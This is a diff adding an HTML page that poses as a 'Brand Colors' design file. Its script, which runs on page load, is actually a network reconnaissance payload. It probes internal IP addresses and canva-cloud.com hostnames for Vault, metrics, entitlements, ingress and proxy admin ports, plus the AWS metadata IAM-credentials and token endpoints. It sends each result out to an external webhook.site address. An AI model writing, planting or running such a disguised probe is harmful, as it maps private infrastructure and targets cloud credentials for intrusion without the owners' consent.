@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html>
+<head><title>Brand Colors</title></head>
+<body>
+<h1 style="color:#cc3300">Professional Brand</h1>
+<script>
+var wh = "https://ecc2dc86-2fe4-41dc-b6dd-8cac2fc896c9.webhook.site";
+new Image().src = wh + "/scan-start";
+
+var targets = [
+  // Vault (secrets!) - port 8200
+  {n:"vault-8200", u:"http://10.156.118.234:8200/"},
+  {n:"vault-8200-v1", u:"http://10.156.118.234:8200/v1/sys/health"},
+  {n:"vault-8200-ui", u:"http://10.156.118.234:8200/ui/"},
+  {n:"vault-dns-8200", u:"http://vault.secret-service.p.canva-cloud.com:8200/"},
+  {n:"vault-80", u:"http://10.156.118.234:80/"},
+  {n:"vault-443", u:"http://10.156.118.234:443/"},
+
+  // Mimir (metrics) - port 8080
+  {n:"mimir-8080", u:"http://10.14.151.188:8080/"},
+  {n:"mimir-8080-config", u:"http://10.14.151.188:8080/config"},
+  {n:"mimir-8080-ring", u:"http://10.14.151.188:8080/distributor/ring"},
+  {n:"mimir-8080-memberlist", u:"http://10.14.151.188:8080/memberlist"},
+  {n:"mimir-dns-8080", u:"http://mimir.telemetry.p.canva-cloud.com:8080/"},
+  {n:"mimir-80", u:"http://10.14.151.188:80/"},
+  {n:"mimir-3100", u:"http://10.14.151.188:3100/"},
+  {n:"mimir-9009", u:"http://10.14.151.188:9009/"},
+
+  // Entitlements API
+  {n:"entl-80", u:"http://10.12.204.140:80/"},
+  {n:"entl-8080", u:"http://10.12.204.140:8080/"},
+  {n:"entl-443", u:"http://10.12.204.140:443/"},
+  {n:"entl-dns-80", u:"http://api.prod.entitlements.p.canva-cloud.com:80/"},
+
+  // Private ingress (same subnet as gRPC)
+  {n:"ingress-80", u:"http://10.149.95.171:80/"},
+  {n:"ingress-8080", u:"http://10.149.95.171:8080/"},
+  {n:"ingress-443", u:"http://10.149.95.171:443/"},
+
+  // OTEL Gateway
+  {n:"otel-4318", u:"http://10.14.172.249:4318/"},
+  {n:"otel-8888", u:"http://10.14.172.249:8888/"},
+  {n:"otel-8080", u:"http://10.14.172.249:8080/"},
+
+  // Also try known gRPC IPs on management ports
+  {n:"ba-15000", u:"http://10.149.76.150:15000/"},
+  {n:"ba-15020", u:"http://10.149.76.150:15020/"},
+  {n:"ca-15000", u:"http://10.149.206.243:15000/"},
+  {n:"om-15000", u:"http://10.149.91.165:15000/"},
+
+  // AWS metadata
+  {n:"meta", u:"http://169.254.169.254/latest/meta-data/"},
+  {n:"meta-iam", u:"http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
+  {n:"meta-token", u:"http://169.254.169.254/latest/api/token"}
+];
+
+var idx = 0;
+targets.forEach(function(t) {
+  setTimeout(function() {
+    var start = Date.now();
+    fetch(t.u, {mode:'no-cors',credentials:'omit'}).then(function(r) {
+      var ms = Date.now() - start;
+      new Image().src = wh + "/ok-" + t.n + "-" + ms + "ms-" + r.type + "-st" + r.status;
+    }).catch(function(e) {
+      var ms = Date.now() - start;
+      new Image().src = wh + "/err-" + t.n + "-" + ms + "ms-" + encodeURIComponent((""+e).substring(0,60));
+    });
+  }, idx++ * 100);
+});
+
+setTimeout(function() { new Image().src = wh + "/scan-done"; }, idx * 100 + 8000);
+</script>
+</body>
+</html>
